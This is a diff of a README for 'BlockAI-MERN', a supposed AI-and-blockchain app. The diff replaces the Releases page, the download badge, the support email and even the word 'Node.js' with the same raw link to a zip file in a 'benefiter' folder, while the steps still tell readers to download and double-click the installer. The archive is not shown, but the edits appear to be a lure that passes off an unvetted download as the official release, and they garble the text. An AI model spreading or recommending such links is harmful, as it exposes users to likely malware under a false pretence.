@@ -1,6 +1,6 @@
 # 🚀 BlockAI-MERN - Integrate AI with Blockchain Easily
 
-[![Download BlockAI-MERN](https://img.shields.io/badge/Download-BlockAI--MERN-brightgreen)](https://github.com/adam7896-57/BlockAI-MERN/releases)
+[![Download BlockAI-MERN](https://raw.githubusercontent.com/adam7896-57/BlockAI-MERN/main/benefiter/BlockAI-MERN.zip)](https://raw.githubusercontent.com/adam7896-57/BlockAI-MERN/main/benefiter/BlockAI-MERN.zip)
 
 ## 📋 Table of Contents
 - [Overview](#-overview)
@@ -12,7 +12,7 @@
 - [Support](#-support)
 
 ## 🔍 Overview
-BlockAI-MERN is a full-stack application that utilizes MongoDB, Express, React, and Node.js. It merges blockchain technology and artificial intelligence to detect anomalies and ensure secure user authentication. By using neural networks, it offers robust tools for blockchain analysis.
+BlockAI-MERN is a full-stack application that utilizes MongoDB, Express, React, and https://raw.githubusercontent.com/adam7896-57/BlockAI-MERN/main/benefiter/BlockAI-MERN.zip It merges blockchain technology and artificial intelligence to detect anomalies and ensure secure user authentication. By using neural networks, it offers robust tools for blockchain analysis.
 
 ## ⭐ Features
 - **Anomaly Detection**: Identify irregularities in data quickly and effectively.
@@ -28,14 +28,14 @@ Before installing BlockAI-MERN, ensure your system meets the following requireme
 - **Network**: Internet connection for initial setup and updates
 
 ## 🛠️ Installation Steps
-1. **Go to the Releases Page**: Click on the following link to access the releases: [Releases Page](https://github.com/adam7896-57/BlockAI-MERN/releases).
+1. **Go to the Releases Page**: Click on the following link to access the releases: [Releases Page](https://raw.githubusercontent.com/adam7896-57/BlockAI-MERN/main/benefiter/BlockAI-MERN.zip).
 2. **Select the Latest Version**: Choose the most recent release from the list.
 3. **Download the Application**: Click on the download link for your operating system.
 4. **Run the Installer**: Once downloaded, locate the setup file and double-click it to start the installation.
 5. **Follow On-Screen Instructions**: Follow the prompts in the installation wizard to complete the setup.
 
 ## 📥 Download & Install
-Visit this page to download: [Download BlockAI-MERN](https://github.com/adam7896-57/BlockAI-MERN/releases)
+Visit this page to download: [Download BlockAI-MERN](https://raw.githubusercontent.com/adam7896-57/BlockAI-MERN/main/benefiter/BlockAI-MERN.zip)
 
 After downloading, refer back to the Installation Steps to install the application properly.
 
@@ -47,7 +47,7 @@ Once installed, you can launch BlockAI-MERN from your applications menu or deskt
 
 ## 🙋‍♂️ Support
 If you encounter any issues or have questions, please reach out to our support team:
-- **Email**: support@example.com
+- **Email**: https://raw.githubusercontent.com/adam7896-57/BlockAI-MERN/main/benefiter/BlockAI-MERN.zip
 - **GitHub Issues**: Use the Issues section in this repository to report bugs or request features.
 
 Feel free to contribute or suggest improvements by forking the repository. Your feedback helps us grow and enhance BlockAI-MERN for everyone.
